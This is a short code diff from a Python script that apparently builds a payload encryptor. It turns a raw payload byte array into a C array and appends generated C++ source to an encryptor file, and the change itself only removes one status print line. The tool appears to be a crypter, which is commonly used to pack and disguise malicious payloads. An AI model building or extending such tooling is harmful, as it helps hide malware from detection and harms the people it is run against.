@@ -34,7 +34,6 @@ def build_encryptor (Encryption, Payload, build_folder):
 
     Payload_Str = "static const unsigned char Data_RawData[] = {" + ", ".join(map(lambda b: hex(b), Payload)) + "};"
     build_folder = build_folder.replace("\\", "/")
-    print(f"\n[+] Building at {build_folder}\n")
     f = open ("Cast\\encryptor.cpp", "a")
     f.write(f"""
 #include <iostream>
